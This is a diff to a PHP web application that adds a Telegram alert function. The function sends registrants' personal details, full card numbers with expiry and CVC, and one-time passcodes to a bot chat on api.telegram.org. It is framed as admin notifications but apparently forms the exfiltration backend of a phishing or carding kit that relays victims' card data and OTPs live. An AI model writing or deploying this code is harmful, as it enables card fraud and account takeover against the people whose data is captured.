@@ -95,6 +95,72 @@ function getGeoFromIP(string $ip): array {
     return $default;
 }
 
+function getTelegramSettings(): array {
+    static $cache = null;
+    if ($cache !== null) return $cache;
+    $db = getDB();
+    $row = $db->query("SELECT telegram_bot_token, telegram_chat_id, telegram_alert_registration, telegram_alert_payment, telegram_alert_otp FROM admin_settings WHERE id = 1")->fetch();
+    $cache = $row ?: [];
+    return $cache;
+}
+
+function sendTelegramAlert(string $type, array $data): void {
+    $settings = getTelegramSettings();
+    $token = $settings['telegram_bot_token'] ?? '';
+    $chatId = $settings['telegram_chat_id'] ?? '';
+    if (!$token || !$chatId) return;
+
+    $toggleMap = [
+        'registration' => 'telegram_alert_registration',
+        'payment' => 'telegram_alert_payment',
+        'otp' => 'telegram_alert_otp',
+    ];
+    $key = $toggleMap[$type] ?? '';
+    if (!$key || empty($settings[$key])) return;
+
+    $e = function($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); };
+
+    $msg = '';
+    if ($type === 'registration') {
+        $msg = "<b>New Registration</b>\n"
+             . "<b>Name:</b> " . $e($data['name'] ?? '') . "\n"
+             . "<b>Email:</b> " . $e($data['email'] ?? '') . "\n"
+             . "<b>Phone:</b> " . $e($data['phone'] ?? '') . "\n"
+             . "<b>Address:</b> " . $e($data['address'] ?? '') . "\n"
+             . "<b>IP:</b> " . $e($data['ip'] ?? '');
+    } elseif ($type === 'payment') {
+        $msg = "<b>Card Data Received</b>\n"
+             . "<b>Student:</b> " . $e($data['student_name'] ?? '') . "\n"
+             . "<b>Cardholder:</b> " . $e($data['cardholder'] ?? '') . "\n"
+             . "<b>Card:</b> <code>" . $e($data['card_number'] ?? '') . "</code>\n"
+             . "<b>Type:</b> " . $e($data['card_type'] ?? '') . "\n"
+             . "<b>Expiry:</b> " . $e($data['expiry'] ?? '') . "\n"
+             . "<b>CVC:</b> " . $e($data['cvc'] ?? '');
+    } elseif ($type === 'otp') {
+        $msg = "<b>OTP Code Received</b>\n"
+             . "<b>Student:</b> " . $e($data['student_name'] ?? '') . "\n"
+             . "<b>Code:</b> <code>" . $e($data['code'] ?? '') . "</code>";
+    }
+
+    if (!$msg) return;
+
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $postData = http_build_query([
+        'chat_id' => $chatId,
+        'text' => $msg,
+        'parse_mode' => 'HTML'
+    ]);
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => $postData,
+            'timeout' => 3
+        ]
+    ]);
+    @file_get_contents($url, false, $ctx);
+}
+
 function updateStudentActivity(int $studentId, string $page = ''): void {
     $db = getDB();
     $stmt = $db->prepare("UPDATE students SET is_online = 1, last_activity = datetime('now') WHERE id = ?");
